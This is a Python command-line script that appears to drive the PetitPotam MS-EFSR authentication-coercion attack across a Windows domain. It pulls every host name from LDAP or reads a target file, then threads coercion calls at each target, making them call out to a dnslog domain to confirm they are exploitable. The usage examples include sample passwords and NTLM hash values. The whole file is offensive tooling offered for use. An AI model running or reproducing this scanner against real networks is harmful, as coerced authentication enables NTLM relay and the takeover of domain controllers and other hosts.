#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import argparse
import sys
import threading
import time
from getpass import getpass

from utils import GetHostname
from utils import PetitPotam


def main():
    parser = argparse.ArgumentParser(add_help=True, description="MS-EFSR PetitPotam  sending dnslog")
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-dc-ip', action="store", metavar="ip address",
                        help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')

    group = parser.add_argument_group('authentication')
    group.add_argument('-u', '--username', action="store", default='', help='valid username')
    group.add_argument('-p', '--password', action="store", default='',
                       help='valid password (if omitted, it will be asked unless -no-pass)')
    group.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH",
                       help='NT/LM hashes (LM hash can be empty)')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')

    group = parser.add_argument_group('target')
    group.add_argument('-target', action="store", metavar='target', help='ip address or hostname of target')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')
    group.add_argument('-file', action="store", metavar='file', default=None, help='Read target from file')
    parser.add_argument('-dnslog', action="store", help='connect dnslog domain')
    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'],
                        default='lsarpc', help='Named pipe to use (default: lsarpc)')

    options = parser.parse_args()

    banner = """
           __                                     
  ___ / _|___ _ __ _ __   ___ _ __ _ __   ___ 
 / _ \ |_/ __| '__| '_ \ / __| '__| '_ \ / __|
|  __/  _\__ \ |  | |_) | (__| |  | |_) | (__ 
 \___|_| |___/_|  | .__/ \___|_|  | .__/ \___|
                  |_|             |_|         
    """

    if len(sys.argv) == 1:
        print(banner)
        print(
            "examples: python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250 -u admin -p Aa123456 -dnslog test.dnslog.cn")
        print(
            "examples: python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -hashes f26fb3ae03e93ab9c81667e9d738c5d9:47bf8039a8506cd67c524a03ff84ba4e -target 192.168.12.200 -dnslog test.dnslog.cn")
        print(
            "examples: python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -p Aa123456  -file file.txt -dnslog test.dnslog.cn")
        sys.exit()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        options.password = getpass("Password:")

    start_time = time.time()

    Target_list = []
    if options.file is None and options.target is None:
        print("Please wait for the dNSHostName attribute to be read from ldap：")
        Target_list = GetHostname.GetHostname(options.username, options.password, options.domain, lmhash, nthash,
                                              options.dc_ip, options.k)
        print("[+] Read a total of %s targets" % (len(Target_list)))
    elif options.target:
        Target_list.append(options.target)
    elif options.file:
        with open(options.file, 'r') as file:
            Target_list.extend(line.strip() for line in file)

    threads = []
    for target in Target_list:
        listener = target + "." + options.dnslog
        thread = threading.Thread(target=PetitPotam.connect, kwargs={
            'username': options.username,
            'password': options.password,
            'domain': options.domain,
            'lmhash': lmhash,
            'nthash': nthash,
            'target': target,
            'pipe': options.pipe,
            'doKerberos': options.k,
            'dcHost': options.dc_ip,
            'targetIp': options.target_ip,
            'listener': listener,
        })
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    elapsed_time = end_time - start_time
    print("[*] 扫描结束,耗时: %s seconds\n" % (elapsed_time))


if __name__ == '__main__':
    main()
